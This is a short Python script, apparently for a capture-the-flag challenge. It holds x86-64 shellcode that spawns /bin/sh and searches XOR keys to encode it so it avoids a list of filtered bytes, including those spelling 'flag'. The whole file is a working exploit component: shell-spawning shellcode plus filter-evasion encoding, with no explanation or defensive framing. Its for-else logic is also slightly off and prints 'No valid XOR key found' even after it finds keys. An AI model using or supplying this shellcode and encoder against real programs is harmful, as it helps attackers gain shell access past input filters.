import struct

# Plain /bin/sh shellcode
shellcode = b"\x31\xf6\x56\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xf7\xee\xb0\x3b\x0f\x05"

# Bad bytes to avoid
bad_bytes = [0x3b, 0x54, 0x62, 0x69, 0x6e, 0x73, 0x68, 0xf6, 0xd2, 0xc0, 0x5f, 0xc9, 0x66, 0x6c, 0x61, 0x67]

# Check if the encoded shellcode contains any bad bytes
def contains_bad_bytes(encoded_shellcode):
    for byte in encoded_shellcode:
        if byte in bad_bytes:
            return True
    return False

# Encode the shellcode
def encode_shellcode(shellcode, key):
    encoded = bytearray()
    for byte in shellcode:
        encoded.append(byte ^ key)
    return encoded

# Loop through potential XOR keys to find a valid one
for key in range(1, 256):
    encoded_shellcode = encode_shellcode(shellcode, key)
    if not contains_bad_bytes(encoded_shellcode):
        print(f"Found valid XOR key: {key:#04x}")
        print("Encoded shellcode:")
        print("".join(f"\\x{byte:02x}" for byte in encoded_shellcode))
        print(",".join(f"0x{byte:02x}" for byte in encoded_shellcode))
        print(f"{encoded_shellcode.hex()}\n")
else:
    print("No valid XOR key found.")
